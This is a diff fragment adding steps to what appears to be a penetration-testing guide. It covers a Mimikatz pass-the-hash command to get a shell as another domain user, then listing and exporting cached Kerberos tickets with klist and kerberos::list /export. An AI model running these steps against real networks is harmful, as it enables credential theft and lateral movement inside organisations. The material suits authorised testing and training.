@@ -127,6 +127,18 @@ Steps:
         ```bash
         sekurlsa::pth /user:admin /domain:bigbiz.com /ntlm:<hash value goes here> /run:<an executable of your choosing>
         ```
+    - In the command above, you would typically run "cmd.exe" or "powershell.exe" to get an interactive shell of that user. 
+
+4. At this point we have escalated privielges to another user (who should have admin rights) and now we can check for cached kerberos tickets. This can be done one of two ways:
+    ```bash
+    klist
+    ```
+    or 
+    ```bash
+    kerberos::list /export
+    ```
+    
+    
 
 
 
